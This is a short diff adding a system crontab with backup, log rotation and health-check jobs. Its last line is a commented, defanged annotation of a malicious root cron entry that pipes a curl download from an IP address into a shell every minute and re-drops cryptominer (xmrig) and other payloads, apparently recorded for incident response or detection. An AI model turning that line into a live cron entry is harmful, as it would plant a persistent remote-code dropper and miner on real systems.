@@ -1,0 +1,5 @@
+# m h dom mon dow user command
+0 3 * * * root /usr/local/bin/backup.sh
+30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+*/15 * * * * nobody /usr/bin/check-health.sh
+# * * * * * root <defanged beacon: curl hxxp://198.51.100.136/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
